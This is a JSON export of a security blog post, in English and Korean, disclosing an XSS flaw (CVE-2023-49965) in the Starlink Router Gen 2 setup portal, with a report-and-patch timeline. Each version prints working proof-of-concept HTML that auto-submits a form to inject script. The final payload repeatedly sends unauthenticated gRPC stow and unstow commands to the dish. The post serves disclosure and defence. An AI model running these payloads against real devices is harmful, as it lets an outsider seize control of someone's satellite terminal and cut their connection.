[{"content":"TL;DR A Cross-Site Scripting (XSS) vulnerability in the initial captive portal page of the second-generation router could allow an attacker to take control of the router and Dishy.\nThe Basics Product : Starlink Router Gen 2 Tested Version : 2022.32.0 (The fix is in versions 2023.48.0 and up) Bug-class : XSS (Cross-Site Scripting) Overview of the Vulnerability The vulnerability is caused by insufficient filtering of input values for the ssid and password parameters on the initial captive portal page (http://192.168.1.1/setup).\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Proof of Concept\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;PoC\u0026#34; method=\u0026#34;POST\u0026#34; action=\u0026#34;http://192.168.1.1/setup\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;ssid\u0026#34; value=\u0026#39;\u0026#34; onfocus=javascript:alert(`XSS`); autofocus=\u0026#34;\u0026#39;\u0026gt; \u0026lt;!-- \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;password\u0026#34; value=\u0026#39;\u0026#34; onfocus=javascript:alert(`XSS`); autofocus=\u0026#34;\u0026#39;\u0026gt; --\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; document.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;, function() { document.getElementById(\u0026#34;PoC\u0026#34;).submit(); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;html\u0026gt; This Cross-Site Scripting (XSS) vulnerability can be leveraged in conjunction with a Cross-Site Request Forgery (CSRF) attack, as shown in the proof of concept above.\nreproduce(PoC).mov\nExploit Normally, the captive portal page should only be active on the router's internal address, 192.168.1.1, but there was a bug in older routers that allowed the captive portal page to be unexpectedly accessible from Dishy's internal address, 192.168.100.1.\nhttp://192.168.1.1/setup → The captive portal page is displayed correctly.\nhttp://192.168.100.1/setup → The captive portal page is also displayed at this address.\n(Normally, access to the captive portal page should not be possible at Dishy\u0026rsquo;s internal address, 192.168.100.1.)\nUsing such a bug along with the Cross-Site Scripting (XSS) vulnerability allows for the circumvention of the browser\u0026rsquo;s Same-Origin Policy (SOP), enabling control over both the Router and Dishy.\n192.168.100.1_PoC.mov\nIt can be confirmed that the same Cross-Site Scripting (XSS) vulnerability occurs at the address http://192.168.100.1/setup as well.\nNow let\u0026rsquo;s see how i can leverage these bugs to take control of Router and Dishy.\nDishy Stow Request Analysis When the `Stow` command is issued from the administrator interface, the following HTTP Request is sent to `Dishy` (Note: The Stow command allows the Dishy antenna to be folded for movement or storage.)\nPOST /SpaceX.API.Device.Device/Handle HTTP/1.1 Host: 192.168.100.1:9201 Content-Length: 8 x-grpc-web: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36 content-type: application/grpc-web+proto Accept: */* Origin: http://dishy.starlink.com Referer: http://dishy.starlink.com/ Accept-Encoding: gzip, deflate, br Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close �} This Request\u0026rsquo;s header contains several important pieces of information.\nx-grpc-web: 1\nThis indicates the use of the gRPC-Web protocol.\n(gRPC-Web is a protocol that allows web clients to make gRPC calls to a server.)\ncontent-type: application/grpc-web+proto\nIt signifies that the data being transmitted uses the gRPC protocol and is encoded in the protobuf format.\nRequest Body\nDishy Stow Request body (Hex)\n\\x00\\x00\\x00\\x00\\x03\\xef\\xbf\\xbd\\x7d\\x00 The request body contains data in the grpc-web+proto format, which likely holds the details of the Stow command.\nPutting this information together, when a user issues a Stow command using the admin interface, the command is sent to Dishy over gRPC, which folds Dishy into a portable state.\nHowever, if you look at the request, you\u0026rsquo;ll notice that there is no authentication for the user sending it.\nThis means that someone other than an administrator could send the same request and take control of Dishy without authorization. But this vulnerability requires the attacker to have physical access to the local network, which limits the scope of the attack compared to attacks that can occur remotely.\nPossibility and Limitations of CSRF Attacks If so, you might be thinking that you can attempt a Cross-Site Request Forgery (CSRF) attack with a payload that sends the same request.\nWhile this is a possible scenario, the browser\u0026rsquo;s Same-Origin Policy (SOP) limits this attack.\ngRPC requires a specific content-type header called application/grpc-web+proto.\nHowever, the Same-Origin Policy (SOP) causes browsers to strip this header when sending requests from other sources.\nThis makes it impossible to send gRPC requests to Dishy from the outside under normal circumstances.\nXSS: An Effective Way to Bypass SOP Normally, a Same-Origin Policy (SOP) restricts web browsers from making requests from different sources.\nHowever, with a Cross-Site Scripting (XSS) vulnerability, an attacker can execute a script within the victim\u0026rsquo;s web browser.\nThe script is considered to have been executed from the same source (i.e., the website the victim is currently on).\nBecause of this, the Same-Origin Policy (SOP) recognizes requests generated by these scripts as coming from the same source, and therefore the restrictions of the Same-Origin Policy (SOP) do not apply in this case.\nTherefore, in a Cross-Site Request Forgery (CSRF) attack using a Cross-Site Scripting (XSS) vulnerability that requires a specific content-type header, such as a gRPC request, because the attack script is executed within the victim\u0026rsquo;s browser, the request is recognized as a legitimate request and sent with this specific content-type header.\nExploit PoC (Proof of Concept) So, by chaining the Cross-Site Scripting (XSS) vulnerability and the aforementioned bug, the payload for sending a Stow gRPC request to Dishy could be composed as follows\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Dishy Stow and Unstow\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;PoC\u0026#34; method=\u0026#34;POST\u0026#34; action=\u0026#34;http://192.168.100.1/setup\u0026#34;\u0026gt; \u0026lt;!-- \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;ssid\u0026#34; value=\u0026#39;\u0026#34; onfocus=javascript:alert(`XSS`); autofocus=\u0026#34;\u0026#39;\u0026gt; --\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;password\u0026#34; value=\u0026#39;\u0026#34;\u0026gt;\u0026lt;script\u0026gt;for(let i=0;i\u0026lt;100;i++){setTimeout(()=\u0026gt;{var xhr=new XMLHttpRequest();xhr.open(\u0026#34;POST\u0026#34;,\u0026#34;http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle\u0026#34;,true);xhr.setRequestHeader(\u0026#34;x-grpc-web\u0026#34;,\u0026#34;1\u0026#34;);xhr.setRequestHeader(\u0026#34;Content-Type\u0026#34;,\u0026#34;application/grpc-web+proto\u0026#34;);xhr.onreadystatechange=()=\u0026gt;{if(xhr.readyState==4\u0026amp;\u0026amp;xhr.status==200){console.log(xhr.responseText);}};xhr.send(new Uint8Array([0,0,0,0,3,146,125,0]).buffer);setTimeout(()=\u0026gt;{var xhr2=new XMLHttpRequest();xhr2.open(\u0026#34;POST\u0026#34;,\u0026#34;http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle\u0026#34;,true);xhr2.setRequestHeader(\u0026#34;x-grpc-web\u0026#34;,\u0026#34;1\u0026#34;);xhr2.setRequestHeader(\u0026#34;Content-Type\u0026#34;,\u0026#34;application/grpc-web+proto\u0026#34;);xhr2.onreadystatechange=()=\u0026gt;{if(xhr2.readyState==4\u0026amp;\u0026amp;xhr2.status==200){console.log(xhr2.responseText);}};xhr2.send(new Uint8Array([0,0,0,0,5,146,125,2,8,1]).buffer);},1000);},i*2000);}\u0026lt;/script\u0026gt;\u0026lt;input type=\u0026#34;hidden\u0026#39;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; document.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;, function() { document.getElementById(\u0026#34;PoC\u0026#34;).submit(); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;html\u0026gt; Demo Exploit-PoC.mp4\nCVE CVE-2023-49965 (Reserved) TimeLine 2023-10-10 : Vulnerability reported to SpaceX/Starlink 2023-10-12 : Recognized as a security vulnerability with a severity of Moderate ( Reward $500 USD ) 2023-11-01 : Patched in the latest release (The fix is in versions 2023.48.0 and up) ","permalink":"https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-eng/","summary":"TL;DR A Cross-Site Scripting (XSS) vulnerability in the initial captive portal page of the second-generation router could allow an attacker to take control of the router and Dishy.\nThe Basics Product : Starlink Router Gen 2 Tested Version : 2022.32.0 (The fix is in versions 2023.48.0 and up) Bug-class : XSS (Cross-Site Scripting) Overview of the Vulnerability The vulnerability is caused by insufficient filtering of input values for the ssid and password parameters on the initial captive portal page (http://192.","title":"2023 SpaceX / Starlink Router Gen 2 XSS (ENG)"},{"content":"TL;DR 2세대 라우터의 초기 captive portal 페이지에서 발생하는 Cross-Site Scripting (XSS) 취약점을 통해 공격자는 Router 및 Dishy를 제어할 수 있습니다.\nThe Basics Product : Starlink Router Gen 2 Tested Version : 2022.32.0 (The fix is in versions 2023.48.0 and up) Bug-class : XSS (Cross-Site Scripting) Overview of the Vulnerability 해당 취약점은 초기 captive portal 페이지(http://192.168.1.1/setup)에서 ssid 및 password 파라미터에 대한 입력 값 필터링이 충분하지 않아 발생합니다.\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Proof of Concept\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;PoC\u0026#34; method=\u0026#34;POST\u0026#34; action=\u0026#34;http://192.168.1.1/setup\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;ssid\u0026#34; value=\u0026#39;\u0026#34; onfocus=javascript:alert(`XSS`); autofocus=\u0026#34;\u0026#39;\u0026gt; \u0026lt;!-- \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;password\u0026#34; value=\u0026#39;\u0026#34; onfocus=javascript:alert(`XSS`); autofocus=\u0026#34;\u0026#39;\u0026gt; --\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; document.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;, function() { document.getElementById(\u0026#34;PoC\u0026#34;).submit(); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;html\u0026gt; 해당 Cross-Site Scripting (XSS) 취약점은 위의 PoC(Proof of Concept)처럼 Cross-Site Request Forgery (CSRF) 공격과 함께 활용될 수 있습니다.\nreproduce(PoC).mov\nExploit 일반적으로는 Router의 내부 주소인 192.168.1.1에서만 captive portal 페이지가 활성화되어야 하지만, 구형 라우터에서는 Dishy의 내부 주소인 192.168.100.1에서도 예상치 않게 captive portal 페이지에 접근할 수 있는 버그가 있었습니다.\nhttp://192.168.1.1/setup → 정상적으로 captive portal 페이지가 표시됨\nhttp://192.168.100.1/setup → 이 주소에서도 captive portal 페이지가 표시됨\n(원래는 Dishy의 내부 주소인 192.168.100.1에서는 captive portal 페이지에 접근할 수 없어야 합니다.)\n192.168.100.1_PoC.mov\nhttp://192.168.100.1/setup 주소에서도 똑같이 Cross-Site Scripting (XSS) 취약점이 발생하는 것을 확인할 수 있습니다.\n이러한 버그와 Cross-Site Scripting (XSS) 취약점을 체이닝하면 브라우저의 Same-Origin Policy (SOP)를 우회하여 Router와 Dishy 모두를 제어할 수 있게 됩니다.\n이제 이러한 버그를 활용하여 어떻게 Router와 Dishy를 제어할 수 있는지 살펴보겠습니다.\nDishy Stow Request Analysis 관리자 인터페이스에서 Stow명령을 내리면 아래와 같은 HTTP Request가 Dishy로 전달됩니다.\n(여기서 Stow명령은 Dishy 안테나를 이동하거나 보관하기 위해 접을 수 있도록 하는 기능입니다.)\nPOST /SpaceX.API.Device.Device/Handle HTTP/1.1 Host: 192.168.100.1:9201 Content-Length: 8 x-grpc-web: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36 content-type: application/grpc-web+proto Accept: */* Origin: http://dishy.starlink.com Referer: http://dishy.starlink.com/ Accept-Encoding: gzip, deflate, br Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close �} 해당 Request의 헤더는 몇 가지 중요한 정보를 담고 있습니다.\nx-grpc-web: 1\ngRPC-Web 프로토콜을 사용함을 나타냅니다.\n(gRPC-Web은 웹 클라이언트에서 서버로 gRPC 호출을 가능하게 하는 프로토콜입니다.)\ncontent-type: application/grpc-web+proto\n전송되는 데이터가 gRPC 프로토콜을 사용하고, protobuf 형식으로 인코딩되었음을 나타냅니다.\nRequest Body\nDishy Stow Request body (Hex)\n\\x00\\x00\\x00\\x00\\x03\\xef\\xbf\\xbd\\x7d\\x00 요청 body에는 grpc-web+proto 형식의 데이터가 포함되어 있으며, 이 데이터는 Stow 명령의 세부 사항을 담고 있을 것 입니다.\n이 정보를 종합해보면, 사용자가 관리자 인터페이스를 사용하여 Stow 명령을 내릴 경우, 해당 명령은 gRPC를 통해 Dishy로 전송되며, 이 과정에서 Dishy는 이동이 용이한 상태로 접혀집니다.\n하지만 Request를 살펴보면 해당 요청을 보내는 사용자에 대한 인증이 없다는 것을 알 수 있습니다.\n이 말은 관리자가 아닌 다른 누군가가 해당 요청을 똑같이 보내 무단으로 Dishy를 제어할 수 있음을 의미하는데, 해당 취약점은 공격자가 로컬 네트워크에 물리적으로 접근할 수 있어야 하므로, 원격으로 발생할 수 있는 공격에 비해 공격 범위가 제한적입니다.\nCSRF 공격의 가능성과 한계 그렇다면, 같은 요청을 보내는 페이로드로 Cross-Site Request Forgery (CSRF) 공격을 시도할 수 있다는 생각이 들 수 있습니다.\n물론 Cross-Site Request Forgery (CSRF) 공격이 가능한 시나리오일 수 있지만, 브라우저의 Same-Origin Policy (SOP) 때문에 이러한 공격이 제한됩니다.\ngRPC는 application/grpc-web+proto라는 특정한 content-type 헤더를 요구합니다.\n그러나, Same-Origin Policy (SOP)는 이 헤더를 브라우저가 다른 출처로부터 요청을 보낼 때 제거하도록 합니다.\n이로 인해 일반적인 상황에서는 외부에서 Dishy로 gRPC 요청을 보내는 것이 불가능합니다.\nXSS : SOP 우회를 위한 효과적인 방법 일반적으로 Same-Origin Policy (SOP)는 웹 브라우저가 다른 출처로부터의 요청을 제한합니다.\n하지만 Cross-Site Scripting (XSS) 취약점을 이용하면, 공격자는 피해자의 웹 브라우저 내에서 스크립트를 실행할 수 있습니다.\n이 스크립트는 동일한 출처(즉, 피해자가 현재 접속해 있는 웹사이트)에서 실행된 것으로 간주됩니다.\n이로 인해, Same-Origin Policy (SOP)는 이러한 스크립트에 의해 생성된 요청을 같은 출처의 요청으로 인식하며, 따라서 이 경우 Same-Origin Policy (SOP)의 제한이 적용되지 않습니다.\n따라서 gRPC 요청과 같이 특정 content-type 헤더를 요구하는 경우 Cross-Site Scripting (XSS) 취약점을 이용한 Cross-Site Request Forgery (CSRF) 공격에서는, 공격 스크립트가 피해자의 브라우저 내에서 실행되기 때문에 정상적인 요청으로 인식해서 이러한 특정한 content-type 헤더도 포함되어 요청이 전송됩니다.\nPoC (Proof of Concept) 그러므로, Cross-Site Scripting (XSS) 취약점과 앞서 언급한 버그를 체이닝해서 Dishy에 Stow gRPC 요청을 보내는 페이로드는 다음과 같이 구성할 수 있습니다.\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Dishy Stow and Unstow\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;PoC\u0026#34; method=\u0026#34;POST\u0026#34; action=\u0026#34;http://192.168.100.1/setup\u0026#34;\u0026gt; \u0026lt;!-- \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;ssid\u0026#34; value=\u0026#39;\u0026#34; onfocus=javascript:alert(`XSS`); autofocus=\u0026#34;\u0026#39;\u0026gt; --\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;password\u0026#34; value=\u0026#39;\u0026#34;\u0026gt;\u0026lt;script\u0026gt;for(let i=0;i\u0026lt;100;i++){setTimeout(()=\u0026gt;{var xhr=new XMLHttpRequest();xhr.open(\u0026#34;POST\u0026#34;,\u0026#34;http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle\u0026#34;,true);xhr.setRequestHeader(\u0026#34;x-grpc-web\u0026#34;,\u0026#34;1\u0026#34;);xhr.setRequestHeader(\u0026#34;Content-Type\u0026#34;,\u0026#34;application/grpc-web+proto\u0026#34;);xhr.onreadystatechange=()=\u0026gt;{if(xhr.readyState==4\u0026amp;\u0026amp;xhr.status==200){console.log(xhr.responseText);}};xhr.send(new Uint8Array([0,0,0,0,3,146,125,0]).buffer);setTimeout(()=\u0026gt;{var xhr2=new XMLHttpRequest();xhr2.open(\u0026#34;POST\u0026#34;,\u0026#34;http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle\u0026#34;,true);xhr2.setRequestHeader(\u0026#34;x-grpc-web\u0026#34;,\u0026#34;1\u0026#34;);xhr2.setRequestHeader(\u0026#34;Content-Type\u0026#34;,\u0026#34;application/grpc-web+proto\u0026#34;);xhr2.onreadystatechange=()=\u0026gt;{if(xhr2.readyState==4\u0026amp;\u0026amp;xhr2.status==200){console.log(xhr2.responseText);}};xhr2.send(new Uint8Array([0,0,0,0,5,146,125,2,8,1]).buffer);},1000);},i*2000);}\u0026lt;/script\u0026gt;\u0026lt;input type=\u0026#34;hidden\u0026#39;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; document.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;, function() { document.getElementById(\u0026#34;PoC\u0026#34;).submit(); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;html\u0026gt; Demo Exploit-PoC.mp4\nCVE CVE-2023-49965 (Reserved) Time Line 2023-10-10 : Vulnerability reported to SpaceX/Starlink 2023-10-12 : Recognized as a security vulnerability with a severity of Moderate ( Reward $500 USD ) 2023-11-01 : Patched in the latest release (The fix is in versions 2023.48.0 and up) ","permalink":"https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-kor/","summary":"TL;DR 2세대 라우터의 초기 captive portal 페이지에서 발생하는 Cross-Site Scripting (XSS) 취약점을 통해 공격자는 Router 및 Dishy를 제어할 수 있습니다.\nThe Basics Product : Starlink Router Gen 2 Tested Version : 2022.32.0 (The fix is in versions 2023.48.0 and up) Bug-class : XSS (Cross-Site Scripting) Overview of the Vulnerability 해당 취약점은 초기 captive portal 페이지(http://192.168.1.1/setup)에서 ssid 및 password 파라미터에 대한 입력 값 필터링이 충분하지 않아 발생합니다.\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Proof of Concept\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;PoC\u0026#34; method=\u0026#34;POST\u0026#34; action=\u0026#34;http://192.","title":"2023 SpaceX / Starlink Router Gen 2 XSS (KOR)"}]